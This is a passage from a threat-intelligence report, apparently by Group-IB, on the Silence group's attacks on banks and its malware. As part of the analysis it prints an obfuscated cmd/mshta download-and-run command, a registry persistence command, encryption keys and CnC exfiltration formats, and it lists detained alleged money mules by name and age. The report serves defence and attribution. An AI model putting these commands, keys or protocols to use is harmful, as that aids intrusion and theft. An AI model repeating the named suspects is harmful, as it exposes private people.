{
    "title": "silence_2.0.going_global",
    "text": "01\n1TABLE OF CONTENTS\nIntroduction  2\nExpanded attack geography  3\nAttack preparation  5\nTactics and key attack tools 8\nAttack timeline: from Russia to Latin America 10\nAttack on Dutch-Bangla Bank 14\nAttack on IT BANK 16\nChanges in tools 19\nDownloader aka TrueBot  20\nIvoke  23\nMainModule aka Silence  25\nEDA  31\nxfs-disp.exe  32\nFlawedAmmyy analysis and its comparison with Silence.Downloader 38\nIoC s 53\nSuricata  —\nYARA  —\nList of sources 58\nRegister for a free product tour to test drive all the benefits \nof Group -IB Threat Intelligence and receive the full version of the \nreport by contacting us through intelligence@group-ib.com.2INTRODUCTION \nThree years ago, a young, motivated Russian-speaking cyber criminal group started targeting \nthe financial sector. Early on, Silence showed signs of immaturity in their TTP by making mistakes \nand copying practices from other groups. Now, Silence is one of the most active threat actors \ntargeting the financial sector. Since we released our original report, Silence: Moving into the \ndarkside , the confirmed damage from Silence's operations has increased fivefold compared to the \nfigures in Group-IB's initial report. \nAs of August 2019, the confirmed amount of funds stolen by Silence from June 2016 to June 2019 is at least \n4.2 million US dollars.\nSilence started by targeting organizations in Russia, gradually shifting their focus to former Soviet \ncountries, and then the world. Over time, the group expanded its geography, which has attracted \nthe attention of cybersecurity researchers. \nThis attention has lead Silence to grow more cautious and increase their OpSec (operational \nsecurity). Silence has made a number of changes to their toolset with one goal: to complicate \ndetection by security tools. In particular, they changed their encryption alphabets, string \nencryption, and commands for the bot and the main module. In addition, the actor has completely \nrewritten TrueBot  loader, the first-stage module, on which the success of the group’s entire \nattack depends. The hackers also started using Ivoke , a fileless loader, and EDA  agent, both \nwritten in PowerShell. Silence has also made a move to including fileless modules in their arsenal, \nalbeit much later than other APT groups, suggesting that the group is still playing catch-up \ncompared to other cybercriminal groups.\nGroup-IB analysts have identified similarities between Silence.Downloader and FlawedAmmyy.\nDownloader, which is believed to be linked to attacks by TA505. Both of these programs seem to \nhave been developed by the same individual.\nSilence 2.0: Going Global  is an extension of our original report: Silence: Moving into the \nDarkside  which remains the most significant contribution to the research on the group \nand is the first such report to reveal Silence’s activity. Our new report encompasses events \nthat occurred between May 2018 and 1 August 2019 and contains a comprehensive description \nof modern TTP.\nTo help with proper attribution and prevent new incidents this report contains sections \nfor technical specialists and analysts to help study the Tactics, Techniques and Procedures (TTP) \nand tools employed by Silence. Suricata, YARA and other detailed technical information is only \navailable to Group-IB Threat Intelligence customers.\nSilence is still playing catch-up: they are adopting the approaches of other groups, all the while modifying older \ntools and trying out new ones.\n 4\nSILENCE 2.0  \nGoing globalPrior to April 2018, as described in Group-IB’s Silence: Moving into the darkside  \nreport, Silence’s target interests were primarily limited to former Soviet and Eastern \nEuropean countries including Russia, Ukraine, Belarus, Azerbaijan, Poland, \nand Kazakhstan. Some campaigns, however, did express initial interest in more \nthan 25 other countries in Central and Western Europe, Africa and Asia, including \nKyrgyzstan, Armenia, Georgia, Serbia, Germany, Latvia, Czech Republic, Romania, \nKenya, Israel, Cyprus, Greece, Turkey, Taiwan, Malaysia, Switzerland, Vietnam, Austria, \nUzbekistan, Great Britain, Hong Kong, and others.In the last successful attack described in Silence: Moving into the darkside , dated April 2018, \nthe hackers siphoned off about $150,000 through ATMs in a single night.\nSince the report’s release in September 2018, Group-IB’s Threat Intelligence team  has detected \n16 campaigns targeting banks launched by Silence. \nAccording to Group-IB’s research, in 2019, Silence has infected workstations in more than \n30 countries with IP addresses in the following countries having communicated with Silence CnC \ninfrastructure:  RU, PL, US, FR, BZ, KG, CA, CR, MX, GB, CZ, MD, CH, KR, BD, CN, RO, BG, JM, \nAG, TW, IN, SE, FI, LU, PA, CL, UA, LV, NO, SC, DE, TR, SG, LK, GH and NL.\nEXPANDED  \nATTACK GEOGRAPHY  Silence: Moving into the darkside \n Silence 2.0: Going Global\n5ATTACK PREPARATION \nLike the majority of APT groups, Silence uses phishing as their infection vector. Now, however, \ntheir campaigns are carried out in two stages. In 2018, Silence conducted test campaigns \nto update their database of current targets and expand their attack geography. The threat actor’s \nemails usually contain a picture or a link without a malicious payload and are sent out to a huge \nrecipient database of up to 85,000 users . \nThese “recon” emails are a preparatory stage for a large-scale campaign and their purpose \nis to receive an updated list of emails as well as obtain information about current cybersecurity \nsolutions the targeted company uses.\nThis step helps create an up-to-date “target” list of active email addresses that can be used \nfor further attacks.\nSilence has conducted at least three campaigns using recon emails, followed by malicious mail \nsent to an updated recipient list. These campaigns were no longer focused just on Russia and \nformer Soviet countries, but spread across Asia and Europe. Group-IB has also detected recon \nemails sent out to New Zealand. Since our last public report, Silence has sent out more than \n170,000  recon emails  to banks in Russia, the former Soviet Union, Asia and Europe. The mails \nwere not customized, however, and were likely used to have a clean list of target recipients for \nfuture campaigns. \nAn example of an email used by Silence during the recon stage of a previous campaign:\n6Recon Campaigns in Asia\nIn November 2018, Silence tried their hand at targeting the Asian market for the first time in their \nhistory. In total, Silence sent out about 80,000 emails , with more than half of them targeting \nTaiwan, Malaysia, and South Korea.\nChart 1 shows the distribution of email recipients by country in descending order:\n Taiwan (21 445)\n Malaysia (15 923)\n South Korea (8 880)\n United Arab Emirates (7 316)\n Indonesia (7 121)\n Pakistan (4 241) Kingdom of Jordan (3 929)\n Saudi Arabia (3 630)\n  Singapore (2 352)\n  Vietnam (1 548)\n Hong Kong (1 135)\n China (382)Attack preparation: distribution of Silence's recon \nemails among Asian countries\n7Recon Campaigns in Russia and the former Soviet Union\nRecon campaigns carried out in Russia and the former Soviet Union were also as large. From  \n16 October 2018 to 1 January 2019 , Silence sent out about 84,000 emails  in Russia alone \nto update their address database. In the former Soviet Union, the attackers targeted banks \nin Kyrgyzstan, Kazakhstan, and Ukraine.\nEuropean Recon Campaigns\nSilence’s European Recon campaign involved the smallest number of email addresses. On October \n18th, 2018, the group sent out emails to British financial companies as part of their preparatory \ncampaign. In total, less than 10,000 emails  without malicious contents were sent to recipients \nin UK banks.\n 8TACTICS AND KEY ATTACK TOOLS\n9With the important exception of the above-mentioned recon emails, Silence’s tactics have \nremained largely the same. As part of their phishing campaigns, the group still uses Microsoft \nOffice documents with macros or exploits, CHM files, and .LNK shortcuts as malicious \nattachments.\nIf the initial infection is successful, a primary loader called Silence.Downloader  (aka TrueBot) \nis installed on the system. In 2019, Group-IB also observed the use of a new fileless PowerShell \nloader called Ivoke . Primary loaders are designed to collect information about an infected system \nand send it to an intermediate CnC server. The operators of such servers then decide whether \nto send a command to load the next stage manually. The primary loader receives a link to the \nnext stage in the form of a command and launches it. The primary loader used by Silence has \nsignificantly evolved and is described in detail in the Changes in Tools  section.\nThe Silence.Main  Trojan, which is the main stage of the attack, has a full set of commands \nto control a compromised computer. As the CnC server, the attackers use CnC-3 server running \nWindows, from which they send commands to download additional modules. The main Trojan has \nbeen modified as well and the changes are described in detail in the Changes in Tools  section.\nIn recent attacks, Silence has started to download a PowerShell agent that is based on the open-\nsource projects Empire (https://github.com/EmpireProject/Empire) and dnscat2 (https://github.\ncom/lukebaggett/dnscat2-powershell/blob/master/dnscat2.ps1). In the chart, the CnC server \nof this program is designated CnC-4. The new Trojan, which we have dubbed EmpireDNSAgent \nor simply EDA , is described in the Changes in Tools  section.\nIn addition, the group downloads the reverse proxy programs Silence.ProxyBot and Silence.\nProxyBot.NET, which are described in detail in the report Silence: moving into the darkside. \nBoth of these programs also use the same CnC-3 server as the backconnect server. No significant \nchanges have been made to these programs, which is why they are not described in this report.\nThe group continues to use winexe, sdelete, and Farse for lateral movement across networks. \nFor more details about these tools, refer to Silence: moving into the darkside.\nTo control ATMs, the group uses the Atmosphere Trojan , which is unique to Silence, or a program \ncalled xfs-disp.exe . No significant changes have been made to Atmosphere. For more details \nabout it, please refer to Silence: moving into the darkside. xfs-disp.exe  is described in the \nChanges in Tools  section.  10ATTACK TIMELINE:  \nFROM RUSSIA TO LATIN AMERICA\nThis report covers events from May 2018 through 1 August 2019. During this time, Silence \nincreased their attack frequency. The arrests of their money mules in Bangladesh did not slow \nthe group down, and the hackers continued to expand their geography.\n•  28 May 2018 – Group-IB specialists tracked a massive mailout of emails containing \na malicious Microsoft Word attachment titled “Договор.doc” [Contract.doc]. The malicious \nemail was drafted in Russian. Analysis of the emails has shown that the attachment contains \nan exploit for the CVE-2017-11882 vulnerability. The exploit installs Silence’s loader, designed \nto download backdoors and other malicious programs.\n• August 2018  – A bank in India was successfully attacked.\n• 16 October 2018 – Silence conducted a malicious campaign targeting Russian banks, with \nthe emails sent from info@bankuco.com.\n• 18 October 2018  – Silence launched a test mailout targeting financial companies in the UK.\n• 18 October 2018 (same day) – Silence sent emails to Russian banks. The attackers managed \nto conduct this campaign while impersonating a real bank due to the lack of SPF settings \non the side of the financial institution in question.\n• 25 October 2018 – Silence sent out emails to Russian banks. As before, the messages \nwere sent from info@bankuco.com. The text referred to the opening and maintenance \nof a correspondent account and was sent under the name of a non-existent bank.\n• 15 and 16 November 2018 – Silence conducted a massive phishing campaign posing as \nthe Central Bank of the Russian Federation. Needless to say, the Central Bank had nothing \nto do with this mailout. Group-IB specialists have established that the aim of the attack was \nto deliver and launch the second stage of Silence’s Trojan, known as Silence.MainModule.\n• 20 November 2018  – Silence conducted the first stage of their Asian campaign, organising \na massive phishing attack aimed at receiving an up-to-date list of current recipients \nin different countries for further targeted attacks delivering their malicious software.\n• 25 and 27 December 2018 – A new malicious mailout from Silence was carried out. It was \ncarried out from the pharmkx[.]group and cardisprom[.]ru domains. In the first case, the email \ncontained two files: “Макет дизайна дебетовой карты.doc”[Debit card design layout.doc] \nand “Макет дизайна дебетовой карты.zip” [Debit card design layout.zip].\n• 4 January 2019 – Silence attacked financial organisations in the UK. The distributed file was \nsigned with a valid signature of SEVA MEDICAL LTD, a UK medical company.\n• 16 January 2019 – For the first time in their history, Silence disguised a malicious attachment 11as an invitation to the international financial forum iFin-2019. The email had a ZIP-archive \nattached, which contained an invitation to the banking forum and the Silence.Downloader \n(TrueBot) malware.\n• February 2019  – Silence successfully attacked another Indian bank.\n• February 2019 (same month)  – Silence successfully withdrew money from Omsk IT Bank \nin Russia. According to public sources, the amount of stolen funds was 25 million roubles \n(around 400,000 US dollars).\n• 21 May 2019 – Emails were sent out purporting to be from a bank’s client with a request \nto block a card. It was the first time Silence used the Ivoke backdoor, a completely fileless \nTrojan, in their attacks.\n• 31 May 2019 – Seven men wearing masks withdrew cash from the ATMs of Dutch-Bangla \nBank in Bangladesh. According to open sources, the group stole about $3 million.\n• 6 June 2019 – Silence configured a new server for their attacks.\n• 20 June 2019 – The group conducted a new attack on banks in Russia.\n• July 2019  – Banks in Chile, Bulgaria, Costa Rica and Ghana were successfully attacked. \nThe attackers used the server deployed on 6 June 2019 to control compromised workstations \nin these banks. A new Trojan named EDA (Empire DNS agent), which is based on the Empire \nand dnscat2 projects, was detected in the attacks.13July 2019\nEDAJuly 2018\nSilence.Downloader\nAugust 2018\nAttack on Indian Bank\nOctober 2018\n• Silence.Downloader\n• Silence.MainModule\nAugust 2018\nSilence.Downloader\nSilence.MainModule\nSilence.ProxyBot.NETSeptember 2018\nSilence.DownloaderDecember 2018\n• Silence.Downloader\n• Silence.MainModuleJanuary 2019\n• Silence.Downloader\n• Silence.ProxyBotFebruary 2019\nSilence.Downloader\nMarch 2019\n• Silence.ProxyBot\n• Silence.MainModule\n• EDA\nMay 2019\nAttack on Dutch-Bangla bank\nApril 2019\n• Silence.MainModule \n• Silence.ProxyBot.NETJune 2019\n• Silence.Downloader\n• Silence.MainModule\nMay 2019\nIvoke (1st stage)May 2019\nAttack on organization \nin Kyrgyz Republic\nJune 2019\nAttack on Russian banksJuly 2019\n•  Attack on banks \nin Chile, Bulgaria, \nGhanaJuly 2016\nSilence.ShadowingModule\nSeptember 2016\nSilence.Downloader\nNovember 2016\nSilence.MainModuleMarch 2017\nSilence.ProxyBot.NetJune 2017\nSilence.MainModule\nJuly 2017\nSilence.MainModule\nOctober 2017\n• Atmosphere\n• Atmosphere.Injector\n• Atmosphere.Dropper\nJanuary 2018\nSilence.ProxyBot.Net\nApril 2018\nATM attack\nNovember 2017\nATM attackMarch 2018\nSilence.ProxyBot\nAugust 2017\nSilence.Downloader\nSilence.MainModuleOctober 2017\nSilence.ProxyBotApril 2018\n• Atmosphere\n• Atmosphere.Dropper\n• Silence.Downloader\nAugust 2016\nSilence.ProxyBot\nJuly 2016\nSilence.ProxyBottools and attacks from  \nJune 2016 to June 2019\nSilence: Moving into the darksideАтаки и инструменты, описанные  \nв исследованиях Group-IB\nSilence 2.0: Going global2017\n2018\nThe attack timeline shows only \nattacks with identified victims \nand confirmed damage.February 2019\nAttack on Russian \"IT Bank\"June 2016\nUnsuccessful ARM CBR attack\nFebruary 2018\nCard Processing attack\n14ATTACK ON DUTCH-BANGLA BANK\nOn 24 March 2019, Silence.ProxyBot ( MD5 2fe01a04d6beef14555b2cf9a717615c ) was uploaded \nto VirusTotal from an IP address in Sri Lanka. The backconnect address for the program was \n185.20.187[.]89. Later, the main Silence backdoor ( MD5 fd133e977471a76de8a22ccb0d9815b2 ) \nwas uploaded; it used the same address for the CnC server.\nGroup-IB experts established that the server 185.20.187.89 started functioning no later \nthan 28 January 2019. Communication with the IP addresses which belonged to Dutch-\nBangla’s infrastructure started no later than 16 February 2019. It is worth emphasising that \ncommunication with the main backend occurs only if the Silence.MainModule main backdoor \nis successfully installed by the operator. This excludes the possibility that connections to the \nmain backend are performed from sandboxes (a class of anti-APT solutions designed to analyse \nmalicious files in an isolated environment).\nAccording to local media1, on 31 May 2019, at 23:30 local time, unidentified individuals wearing \nmedical masks started withdrawing money from the ATMs of Dutch-Bangla Bank. According \nto the local media reports, money mules (individuals engaged by hacker groups to withdraw \nmoney from ATMs) have used Dutch-Bangla Bank cards for illegitimate cash withdrawals twice. \nIn the first incident, they used them outside of Bangladesh, according to the media reports.\nIn the second incident, reported by the media, money was stolen from a Dutch-Bangla \nATM in Dhaka, which was recorded by CCTV cameras. The video2 is available on YouTube. \nIt is interesting to note that the cash withdrawal occurred in the presence of an ATM security \nguard. The recording shows the faces of the mules. According to local media reports, in 2019 \nSilence successfully withdrew money from the Bangladeshi bank twice within 2 months.\n*Picture: https://en.prothomalo.com/bangladesh/news/196691/Six-foreign-citizens-detained-in-never-seen-before\nPhoto: Prothom Alo15Thanks to the fact that the final stage of the attack (cash withdrawal by money mules) was \nrecorded on video, the local police were able to quickly detain the suspects. As reported \nby the media, they turned out to be six Ukrainian citizens:\nAs media reports suggest, only one suspect, a 31-year-old man, managed to escape [3] [4] [5] [6]. \nAccording to law enforcement reports, the money mules arrived in Bangladesh from Turkey \non 30 May 2019 and were going to fly from the country to India on 6 June 2019. \nDutch-Bangla Bank: two attack vectors\nAccording to the official statement by Abul Kashem Mohammad Shirin, Chief Executive Officer, \nMD & Director at Dutch-Bangla Bank, the money withdrawal took place from ATMs but did not \nleave any traces of transactions in the bank’s systems. This suggests that a third party may have \ncontrolled the ATM dispenser remotely.\nFirst vector: attack on ATMs. The CCTV footage shows that the money mules making phone \ncalls before withdrawing money. After each call, a third party sent a command to dispense money \nto the mules. To do this, the actor may have used a unique tool called Atmosphere, a Trojan \ndeveloped by Silence to remotely control ATM dispensers, or a similar program called xfs-disp.\nexe, which the actor may have used in their attack on IT Bank. Throughout the group’s observed \nactivity, the Atmosphere Trojan has been modified to meet Silence’s requirements. In the vast \nmajority of their attacks, the group has used this particular well-developed tool for the purpose \nof theft.\nSecond vector: attack on card processing. After the high-profile incident in Bangladesh, a number \nof media outlets reported that funds were also stolen from Dutch-Bangla ATMs in Cyprus, \nRussia and Ukraine. This indicates that attacks may have been carried out by compromising card \nprocessing.\nAs we described in Silence: Moving into the darkside  report, Silence has experience with \ntheft using compromised card processing systems. In such cases, the hackers are capable \nof withdrawing much larger amounts, with more security ensured for the money mules. However, \nif the attackers had used this method of stealing money from Dutch-Bangla Bank, the mules \nwould not have had to fly to Bangladesh and make calls to a third person. This means that either \nthe information about cash withdrawals in other countries might be incorrect, the same bank was \nalso attacked by another hacker group, or Silence used both methods in this incident.\nIn any of these scenarios, the number of withdrawals, as well as the amount of stolen money, may \nbe much larger. At the moment, the confirmed damage from this attack as reported by local media \nis around $3 million.\n • Dennis Vitomeski, 20\n• Nazari Vojnok, 19\n• Valentine Sokolovski, 37• Sergei Ukrainetz, 33\n• Oleg Shevchuk, 46\n• Valodimir Trushiniski, 3716ATTACK ON IT BANK\nIn February 2019, Russian media7 reported a Silence attack on IT Bank in the city of Omsk. \nThe information available to Group-IB experts suggests the following chain of events.\nOn 16 January 2019, Silence sent out phishing emails with malicious attachments disguised \nas invitations to the International Financial Forum iFin-2019 (see section ‘Attack timeline’).\nInterestingly, the XIX International Forum iFin-2019 “Electronic Financial Services and \nTechnology” took place in Moscow on 19 and 20 February 2019, which was announced by the \norganisers at around 9 am Moscow time on 16 January. In just a few hours, Silence sent out their \n“invitations”. The campaign purported to be from Forum iFin-2019, but used the address  \ninfo@bankuco[.]com and the mail server mail1.bankuco[.]commail1.bankuco.com 46.30.41[.]232. \nTextual matches indicate that the attackers used a modified text of the official invitation.\nThe email attachment contained a ZIP archive named Priglashenie.zip [Invitation.zip]  \n(MD5 a1756302ffa230bb7e6b24f18857c730 ). The archive was created on 15 January 2019 \nat 10:43:18. It contains a Microsoft help file named “Приглашение на конференцию 13012019.\nchm” [Invitation to the сonference 13012019.chm] ( MD5 08ae8fe12d89a1aaf6b1ee7776727fd1 ).\n17Once the CHM file is opened, the cmd.exe command interpreter is launched with the parameter:\nС:\\Windows\\System32\\cmd.exe /c copy C:\\Windows\\Syste%ALLUSERSPROFILE:~9,1%32\\cmd.exe \"%appdata%/\ndmw.exe\" /Y && echo 3 >> \"%appdata%/dmw.exe\" && \"%appdata%\\dmw.exe\" /c start %ALLUSERSPROFILE:~\n9,1%sht%ALLUSERSPROFILE:~8,1% \"http://185.70.186[.]146/%ALLUSERSPROFILE:~4,4%.php\"\nAs a result, a VB script called rogr.php ( MD5 14732e82a6cbd108c40540314b029ee3 ) will \nbe downloaded from http://185.70.186[.]146/rogr.php and executed.\nOnce launched, the VB script rogr.php performs the following actions:\n1. Creates a directory %APPDATA%\\[knytaqojwv]{6}\n2. Drops the “certificate” http://185.70.186[.]146/nc-bank.crt named %APPDATA%\\\n[knytaqojwv]{6}\\[knytaqojwv]{6}.tmp to the created directory\n3. Decodes base64-encoded contents of the “certificate” %APPDATA%\\[knytaqojwv]{6}\\\n[knytaqojwv]{6}.tmp and saves them to %APPDATA%\\[knytaqojwv]{6}\\[knytaqojwv]{6}2.tmp, \nwhich also imitates a certificate\n4. Decodes base64-encoded contents of the “certificate” %APPDATA%\\[knytaqojwv]{6}\\\n[knytaqojwv]{6}2.tmp and saves them to %APPDATA%\\[knytaqojwv]{6}\\[knytaqojwv]{6}.com, \nwhich is an executable file\nnc-bank.crt aka %APPDATA%\\[knytaqojwv]{6}\\[knytaqojwv]{6}.tmp  \n(MD5 51f1b893b72821c59556b8c9958eb4a4 )\n%APPDATA%\\[knytaqojwv]{6}\\[knytaqojwv]{6}.com aka C:\\ProgramData\\WIN7Z\\wsus.exe - \nSilence.Downloader aka TrueBot ( MD5 edf59a111cce8ea1d09a2b4e8febdfdf )\nCnC 185.70.187[.]188\nGroup-IB also detected emails sent out from the domains bankica[.]top, bankusr[.]ru, ccrbank[.]\nru, and fpbank[.]ru as part of the campaign. Some of the emails were disguised as urgent requests \nto open a correspondent account:\n18Group-IB specialists determined that the email addresses of IT bank employees were among \nthe recipients of these emails. This suggests that these emails were likely used as an entry point \nfor the attack.\nOn 25 February 2019, the program xfs-test.exe, which was compiled on 10 February 2019, was \nmanually uploaded to VirusTotal from a Russian IP address using the web interface. This program \nis designed to send commands directly to ATM dispensers, which results in all available cash being \ndispensed. The program contains a path to the debug information C:\\_bkittest\\dispenser\\Release_\nnoToken\\dispenserXFS.pdb. The folder name bkittest could be an abbreviation of “Bank IT test”, \nand links the file with the attack on IT Bank.\nTwo days after the compilation, information about the theft from IT Bank's ATMs appeared \nin the media. As a result of this attack, the bank lost about $400,000 .19CHANGES IN TOOLS\nThe report titled Silence: Moving into the Darkside , which was released in 2018, provided \na detailed analysis of the entire toolset used by the Silence group. This section describes the \ndynamics of changes in the toolset after May 2018: some programs have remained the same, \nwhile others have been modified to bypass security systems more successfully. In addition, new \ntools have appeared.\nNew tools:\n1.   The Ivoke loader, written in PowerShell, is the first fileless module used by Silence. \nIt is interesting to note that they started using fileless tools later than other groups. \nThis confirms that Silence has spent their evolution “catching up”: they first studied the \napproaches of other groups, and then customised them.\n2.   EDA is a PowerShell agent based on the Empire and dnscat2 projects. The program \nis designed to control compromised systems by performing tasks through the command shell \nand tunneling traffic using the DNS protocol. This program was first discovered in March \n2019.\n3.   xfs-disp.exe is a Trojan for attacking ATMs, which was allegedly used in the attack on IT Bank.\nChanges: \n1. The execution logic of Silence.Downloader and Silence.Main, as well as the commands \nexecuted by bots, have changed.\n2. Encryption has been added to the Silence.Downloader loader.\n3. The communication protocol between the CnC server and Silence.Main has been changed.\nLink between Silence.Downloader and FlawedAmmyy\nA comparative analysis of Silence.Downloader and the FlawedAmmyy loader revealed that these \nprograms were developed by the same person.\nIt is important to note, however, that a link between Silence and attacks using FlawedAmmyy \nhas not been confirmed: the infrastructure and the techniques of the attacks in these cases \ndiffer greatly.\nThe FlawedAmmyy.Downloader has been observed in attacks on different targets in various \nregions. Some researchers emphasise that the TA505 group also uses this tool to conduct their \noperations.\nThe tools that have remained the same are ProxyBot, ProxyBot.NET, and Atmosphere.20Downloader aka TrueBot\nThe main goal of Silence.Downloader is to receive an executable file and run it on an infected \nmachine. The web address at which the executable file is located is sent by the CnC server \nfollowing a manual command from the operator, which means it cannot be obtained from \na sandbox. \nThe first sample of Silence.Downloader was detected in August 2017  \n(SHA1 2ee8ee6d8ca6e815d654bb96952861f3704e82e9 ). The new version of the loader  \n(SHA1 974f24e8f87e6a9cce7c6873954ecab50ffa6f92 ) was discovered in Q3 2018. \nIts functionality was significantly modified in order to more effectively bypass sandboxes \nand network security solutions:\n• Removed mutex creation;\n• Changed the list of drive letters for generating bot ID;\n• Changed the algorithm for generating the identifier of an infected machine;\n• Added features for collecting and transferring data about an infected machine;\n•  Added data encryption. Communication with the CnC server is encrypted, but not \ncompletely. Information about the infected machine is transmitted in clear text;\n• Changed the paths for saving files;\n• Changed the algorithms for generating file names;\n• Changed the URLs for sending requests;\n•  Changed the list of supported commands. The new version only supports downloading \nand running executable files.\nLike previous versions, Silence.Downloader contains a large number of function calls that \ndo not affect the program’s control flow. The application starts operating with a delay of 2.5 \nseconds. Following this, it attempts to open the %APPDATA%\\temps.dat file.\nShould the file in question be absent in the file system, information about the infected machine \nwill be collected. The necessary information is gathered by executing commands in the cmd.\nexe command line interpreter. The output is forwarded to a file located in the following path: \n%APPDATA%\\temps.dat.\nA list of system information collected :\n1. List of running processes\n2. Information about current remote desktop sessions\n3. Information about network adapters (IP address, subnet mask, gateway address)\n4. Computer name\n5. Infected machine ID21An example of commands used to collect information of interest is presented below:\ncmd /C tasklist >> %APPDATA%\\temps.dat\ncmd /C qwinsta >> %APPDATA%\\temps.dat\ncmd /C ipconfig >> %APPDATA%\\temps.dat\ncmd /C hostname >> %APPDATA%\\temps.dat\nMachine ID is calculated based on the serial number of one of the disk partitions (the first \npartition that it will be able to receive): \"C\", \"D\", \"E\", \"F\", or \"Z\". If there are no partitions with the \nabove-mentioned letters on the infected computer, the constant 0x9A449F is used as a serial \nnumber. To calculate the ID, the application adds the serial number to the integer constant \n0x862937. \nCollected information is transmitted using a POST request to the address 185.70.186[.]149/\ndns_check/logs/logpc.php. Data about the infected machine is transferred in plain text. The \nPOST requests have the following format:\n------qwerty\nContent-Disposition: form-data; name=\"program\"\n<BOTID>\n------qwerty\nContent-Disposition: form-data; name=\"file\"; filename=\"%APPDATA%\\temps.dat\";\nContent-Type: application/octet-stream\nContent-Transfer-Encoding: binary\n<COLLECTED_INFO>\n------qwerty--\n22• The botid parameter is the infected machine ID\n• The OS_VERSION parameter has one of the following values:\n• UNKN\n• 2000\n• XP\n• S2003\n• VISTA\n• S2008R2• S2008\n• WIN7\n• WIN8\n• WIN81\n• WIN10\n• 64 • 32• The PROC_ARCH parameter takes one of the following values:In the event that the file %AppData%\\temps.dat is present in the file system, the application copies \nitself to the startup folder. This is performed by executing a command in the cmd.exe command line \ninterpreter. The command text is encrypted using the PikeJaXyzeUawuma  key (the decryption \nalgorithm is BASE64 → URL → RC4 → URL) . After decrypting the data, the following command will \nbe available:\n/C REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WinNetwork Security\"  \n/t REG_SZ /d \"%s\" /f\nEnsuring persistence in the system depends on the availability of the process avp.exe. If this \nprocess is absent from the system, the application will copy itself (provided there is no file) \nto the path % PROGRAMDATA%\\svconhost.exe. and delete the alternative data stream in the \npath %PROGRAMDATA%\\svconhost.exe:Zone. Identifier. If the process in question is present, \nthe application will add the current location to autostart.\nOnce the information about the infected system has been collected or the attacker has ensured \npersistence in the system, the application switches to a standby mode, waiting for further \ncommands. To do this, it creates a GET request, in which the following data is transferred: infected \nmachine ID, operating system version and bitness. Once the required data is received, the following \nstring will be generated:\nn=<botid>&o=<OS_VERSION>&a=<PROC_ARCH>\nA description of the parameters passed is presented below:23The generated string is encrypted using the key FKh23yu7T*&^@#  and sent to the address \n185.70.186[.]149/dns_check/dns.php?dns=<ENC_STR>. The data encryption algorithm  \nis URL → RC4 → URL → BASE64.\nThe program sends the above-mentioned request to the server with an interval of 2 minutes. \nIn response, the server will send a command. The key used for decryption is FKh23yu7T*&^@# . \nProcessing messages from the server begins only if the message is longer than 10 characters. \nIf the decrypted string starts with \"http://\", the payload will be loaded from the server. The \nreceived content is saved to a file called %APPDATA%\\[0-9a-f]{8}.dates. The file name, which \nis generated randomly, is a four-byte number written in hexadecimal. The Windows API function \nCoCreateGUID() generates a unique 128-bit number. \nThe output is written to the GUID structure. The application uses only a part of the fields in this \nstructure. As a result, the number will be calculated using the following formula: GUID.Data1 * \nGUID.Data2 - GUID.Data3 + 0xCB6. A formal definition of the GUID structure is presented \nbelow:\ntypedef struct _GUID {\n    DWORD Data1;\n    WORD  Data2;\n    WORD  Data3;\n    BYTE  Data4[8];\n};\nThe received data is encrypted using the jgsi23894uhnfjusiof  key. After decryption, the data \nis written to the file %APPDATA%\\ CHROME-[0-9a-f]{8}.exe. To generate four-byte numbers, \nthe CoCreateGuid() function is used too.\nIn this case the formula differs from the previous version and is as follows: GUID.Data1 * \nGUID.Data2 - GUID.Data3 + 0xD435. Once the data are decrypted and written to the file, the \nencrypted version of the file (%APPDATA%\\[0-9a-f]{8}.dates) will be deleted. If the decrypted file \nstarts with “MZ”, the application will launch it.\nIvoke\nThe Ivoke backdoor is a completely fileless Trojan. Its main task is to collect information about the \ninfected system and load the next stage upon command from the CnC server.\nOn 21 May 2019 , a malicious email campaign was launched. The emails purported \nto be from a bank customer and contained a request to block a bank card. The \nmessages were used to deliver an encrypted 7z archive called Novikov.7z ( SHA1 \ne22d5170981b8150dd08eda9b7eca7f5317247af ). The archive contains a shortcut named \nStatement_180619.docx.lnk  \n(SHA1 4d0d5ecaea133dbcc603119a5271796bfe371036 ). \nThe shortcut runs MSHTA.exe, which launches the cmd.exe command interpreter. The \ncommand interpreter launches powershell.exe, downloads a remote PowerShell script located 24at http://193.109.69[.]5/gggm/upl/txtand executes it. \nThe text of the email, and the use of legitimate email servers and an .LNK file, may indicate that \nthe Silence criminal group is responsible for the campaign. In addition, the server 193.109.69[.]5 \nwas leased from Hostkey, a service provider which is often used by this group.\nTo download ReconModule, a backdoor designed to perform initial reconnaissance, the threat \nactor uses the following header:\nUser-Agent: M/5.18\nThe .LNK shortcut downloads and executes the PowerShell script txt.ps1 ( SHA1 \nf858c23c03a598d270eba506f851fb14685809fd ), which is responsible for collecting system \ninformation and loading the next stage. Unfortunately, the next-stage module has not been \ndetected. Txt.ps1 is a PowerShell script that is tracked as the APT.Silence.Ivoke.ps backdoor. The \nscript operates as Silence.Downloader. The backdoor is not stored on disk and is hosted in \nmemory.\nOnce launched, the program registers on the CnC server at http://193.109.69[.]5/gggm/book.php \nby sending a POST request. The request contains the compromised system's information in the \nfollowing format:\ninfo|<OS major version number><OS minor version number><OS build number><PID>|<OS major \nversion number>|<OS minor version number>|<OS minor version number>|0|<computer name>|<user \nname>|<0 - if a 32-bit version, 1 – if a 64-bit version>\nExample: info|6176011233|6|1|1|0|Computer-NAME|User-name|0\n25The string <OS major version number><OS minor version number><OS build number><PID> \nis used as a bot ID. Following this, every 25 seconds, the program sends POST requests to the \nCnC server to obtain the second stage:\nping|<OS major version number><OS minor version number ><OS build number><PID>\nExample: ping|6176011233\nIf the server responds with the string doneyyyyyyyyaa, the process will be terminated, because \nthe machine is not one which the attacker is interested in. Otherwise, the server will send \na base64-encoded response, which will be decoded, saved and executed to the directory \n%TEMP%\\<OS major version number><OS minor version number>< OS build number ><PID>.exe.\nMainModule aka Silence\nThis program is designed to remotely control a compromised system and is capable \nof downloading and running files from remote network nodes, executing commands in the \ncommand shell, and uploading local files to the CnC server. The following versions of the program \nwere compared:\n•  an intermediate version (SHA1 c59cb38bcada36d8c7a671642146ff39f1f49693), discovered \nin November 2018;\n•  the latest version (SHA1 1477b18e917c295df9b3c5624e91057999a3f2b6) used in the \nattacks in early 2019;\n•  earlier versions of Silence.MainModule 2017 (taken into account only in the comparative \ntable at the end of the chapter).\nDescription and functionality of the 2019 version\nSilence.MainModule is a typical remote control Trojan that provides access to the command \nshell CMD.EXE with the possibility of downloading files from remote nodes to a computer \nand uploading files from a computer to a remote server.\nCompared to the samples from 2017, the intermediate version had a new command added for \nsending files from a compromised system to the CnC 